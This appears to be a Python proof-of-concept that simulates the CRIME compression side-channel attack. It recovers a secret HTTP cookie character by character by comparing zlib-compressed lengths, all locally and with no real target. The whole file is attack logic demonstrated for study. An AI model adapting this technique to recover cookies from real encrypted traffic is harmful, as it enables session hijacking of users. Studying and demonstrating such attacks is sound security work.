import sys
import zlib
import string
import random

charset = string.letters + string.digits

COOKIE = "".join(random.choice(charset) for x in range(30))

HEADERS = ("POST / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.  (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
        "Cookie: secret=" + COOKIE + "\r\n"
        "\r\n")

BODY = ("POST / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537. (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
        "Cookie: secret=")

cookie = ""

def compress(data):
    c = zlib.compressobj()
    compressed_data = c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)
    return compressed_data

def get_possible_chars(body):
    global charset
    base_length = len(compress(HEADERS + body))
    possible_chars = []
    for c in charset:
        length = len(compress(HEADERS + body + c))

        if length <= base_length:
            possible_chars.append(c)

    return possible_chars

def find_next_char():
    global cookie
    while len(cookie) < len(COOKIE):
        possible_chars = get_possible_chars(BODY + cookie)
        cur_body = BODY
        while not len(possible_chars) == 1:
            if len(cur_body) < 1:
                return False

            cur_body = cur_body[1:]
            possible_chars = get_possible_chars(cur_body + cookie)

        cookie = cookie + possible_chars[0]
        print("DEBUG: Current cookie \t" + cookie)
    return True
    

print("==================== CRIME ATTACK ====================")

while BODY.find("\r\n") >= 0:
    if not find_next_char():
        cookie = cookie[:-1]
   
    if len(cookie) >= len(COOKIE):
        break

    print("STUCK: Trying to reduce body length...")
    BODY = BODY[BODY.find("\r\n") + 2:]
    
print("")
print("*** Original cookie :\t" + COOKIE)
print("*** Found cookie :\t" + cookie)
